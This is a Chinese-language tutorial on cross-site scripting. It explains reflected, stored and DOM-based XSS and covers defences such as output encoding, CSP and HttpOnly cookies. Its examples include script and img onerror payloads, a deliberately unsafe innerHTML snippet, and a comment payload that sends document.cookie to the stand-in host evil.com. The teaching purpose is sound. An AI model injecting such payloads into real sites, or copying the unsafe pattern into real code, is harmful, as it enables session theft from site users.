== XSS攻击讲解

=== 什么是 XSS?
**XSS**, 全称 **Cross-Site Scripting**, 即**跨站脚本攻击**.

它是一种常见的网络安全漏洞, 攻击者利用它向网页中注入恶意的客户端脚本(通常是 JavaScript).

**核心原理:** 攻击者想方设法, 让原本应该只显示**数据**的网页, 错误地将其**数据**当作了**代码**来执行.

**一个简单的比喻:**

一个网页就像一个餐厅. 用户输入(如评论、用户名)就像是顾客点的食材. 网站后端是厨房, 它会把做好的菜(包含用户食材的网页)端给顾客(浏览器). XSS 攻击就是有顾客点了一份"鱼", 但厨房没有仔细检查, 发现这条"鱼"其实是一枚伪装成鱼的炸弹. 当餐厅把这道菜端给其他顾客时, 炸弹就会在其他顾客的桌子上爆炸.

=== XSS 攻击的危害有多大?
一旦成功利用 XSS 漏洞, 攻击者可以:

. **盗取用户 Cookie:** 获取用户的会话凭证, 从而直接登录用户的账户.

. **发起未授权操作:** 冒充用户执行任何操作, 如转账、发消息、购物等.

. **键盘记录:** 监听用户在网页上的所有键盘输入, 盗取密码、银行卡号等敏感信息.

. **钓鱼攻击:** 在页面上伪造一个登录框, 诱骗用户输入账号密码.

. **劫持用户会话:** 完全控制用户在网站上的会话.

. **传播蠕虫:** 在社交网站上, 一个 XSS 蠕虫可以自动传播给受害者的所有好友, 造成巨大影响.

=== XSS 攻击的三种主要类型
为了更好地理解, 我们假设一个简单的博客网站, 它有一个评论功能.

==== 类型 1: 反射型 XSS

**特点:** **非持久化**. 攻击脚本"躺"在 URL 里, 需要诱骗用户自己去点击这个链接才能触发.

**攻击流程:**

. 攻击者构造一个恶意的 URL, 其中包含脚本代码.

. 攻击者通过邮件、聊天工具等途径, 诱骗用户点击这个 URL.

. 用户点击后, 服务器将恶意代码"反射"回用户的浏览器页面中.

. 用户的浏览器执行了该恶意脚本.

**示例:**

[source, text, linenums]
----
假设网站的搜索功能没有做好过滤, 搜索关键词会直接显示在结果页上.

正常搜索: https://example.com/search?q=apple

结果页显示: 您搜索的关键词是: apple
----

[source, text, linenums]
----
恶意攻击 URL: https://example.com/search?q=<script>alert('XSS')</script>

如果网站没有过滤 q 参数, 结果页就会变成:

您搜索的关键词是: <script>alert('XSS')</script>

浏览器会弹出一个警告框, 显示"XSS". 在实际攻击中, 这里的脚本会是盗取 Cookie 的代码.
----

==== 类型 2: 存储型 XSS
**特点:** **持久化**. 攻击脚本被永久地"存储"在目标网站的服务器上(如数据库、文件、评论等). 所有访问到该内容的用户都会中招. 这是**危害最大**的一种 XSS.

**攻击流程:**

. 攻击者将一段恶意脚本提交到网站(例如, 写一篇带脚本的博客评论).

. 网站后端服务器未经处理就将该脚本保存到了数据库中.

. 当其他正常用户浏览到这条评论时, 恶意脚本会从服务器传递给他们的浏览器并执行.

**示例:**

[source, text, linenums]
----
在博客的评论框里, 攻击者不写"好文章! ", 而是写:
<script>window.location='http://evil.com/steal?cookie='+document.cookie</script>
如果网站没有过滤评论内容, 这条评论就会被存入数据库. 之后任何访问这篇文章的用户, 浏览器都会执行这段脚本, 将他们的登录 Cookie 发送到攻击者的服务器 evil.com.
----

==== 类型 3: DOM 型 XSS
**特点:** 漏洞发生在**客户端**的 JavaScript 代码中, 与服务器后端无关. 这是纯前端的漏洞.

**攻击流程:**

. 攻击者构造一个特殊的 URL, 其中包含恶意代码.

. 用户点击这个链接.

. 用户浏览器加载页面, 页面的 JavaScript 代码(例如, 从 URL 中获取参数并动态写入到 HTML 中)执行.

. JavaScript 代码**不安全地操作了 DOM**, 将恶意代码当作了 HTML 的一部分, 导致其执行.

**示例:**

[source, text, linenums]
----
假设有一个页面, 其 JavaScript 代码如下:

// 从 URL 锚点(hash)部分获取信息并显示
var welcomeMessage = "Welcome, " + location.hash.substring(1);
document.getElementById("message").innerHTML = welcomeMessage;

正常访问: https://example.com/welcome#Alice
页面显示: Welcome, Alice

恶意访问: https://example.com/welcome#<img src=x onerror=alert('XSS')>
页面 JavaScript 会执行:
document.getElementById("message").innerHTML = "Welcome, <img src=x onerror=alert('XSS')>";
浏览器会解析 img 标签, 并执行 onerror 事件里的 JavaScript 代码.
----

=== 如何防御 XSS 攻击?
防御 XSS 的核心思想是: **永远不要信任用户输入**. 必须对用户提交的所有数据进行严格的处理.

==== 对输入进行过滤(Input Filtering)
* **原则:** 在数据进入服务器之前, 进行严格的检查和过滤.

* **方法:**

** 定义白名单: 只允许特定的字符(如字母、数字、有限的符号)通过.

** 黑名单: 虽然效果较差, 但可以过滤掉明显的危险标签和属性(如 <script>, onclick, javascript: 等).

* **注意:** 过滤不能作为唯一的防御手段, 因为上下文不同, 过滤规则会很复杂.

==== 对输出进行编码(Output Encoding)【最关键】
* **原则:** 在将数据输出到 HTML 页面时, 根据其出现的**上下文**, 进行相应的编码, 确保数据始终被当作**文本**, 而不是**代码**.

* **方法:**

** **HTML 上下文:** 使用 HTML 实体编码.

*** 将 < 编码为 \&lt;

*** 将 > 编码为 \&gt;

*** 将 & 编码为 \&amp;

*** 将 " 编码为 \&quot;

*** 将 ' 编码为 \&#x27;

这样, <script> 就会变成 \&lt;script\&gt;, 浏览器会把它显示为文本, 而不会当作标签解析.

** **HTML 属性上下文:** 同上, 也需要进行 HTML 编码.

** **JavaScript 上下文:** 使用 JavaScript Unicode 转义.

*** 如将 < 编码为 \u003c

** **URL 上下文:** 进行 URL 编码.

==== 使用内容安全策略(Content Security Policy, CSP)
* **现代浏览器的终极利器**. CSP 是一个 HTTP 响应头, 它告诉浏览器只允许执行来自哪些源的脚本、样式等资源.

* **工作原理:** 即使攻击者成功注入了恶意脚本, 因为该脚本的来源不在 CSP 白名单内, 浏览器也会拒绝执行它.

* **示例:**
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
这个策略表示: 默认只允许加载同源的资源, 脚本只能来自同源或 https://trusted.cdn.com.

==== 设置 Cookie 的 HttpOnly 属性
* 对于会话 Cookie, 务必设置 HttpOnly 标志.

* Set-Cookie: sessionid=abc123; HttpOnly

* 设置了 HttpOnly 的 Cookie 无法通过客户端的 JavaScript(如 document.cookie)访问, 这样即使发生 XSS, 攻击者也无法直接盗取用户的 Cookie.

|===
|特征|反射型 XSS|存储型 XSS|DOM 型 XSS

|**持久性**
|非持久
|持久
|非持久

|**存储位置**
|URL
|服务器数据库
|URL

|**触发方式**
|用户点击恶意链接
|用户浏览正常页面
|用户点击恶意链接

|**谁的责任**
|服务器端输出编码
|服务器端输入过滤 & 输出编码
|前端 JavaScript 代码

|===

**防御黄金法则:**

* **对输入进行严格的校验和过滤.**

* **在输出到不同上下文前, 进行正确的编码.**

* **为所有 Cookie 设置 HttpOnly 属性.**

* **部署强有力且配置正确的 CSP.**
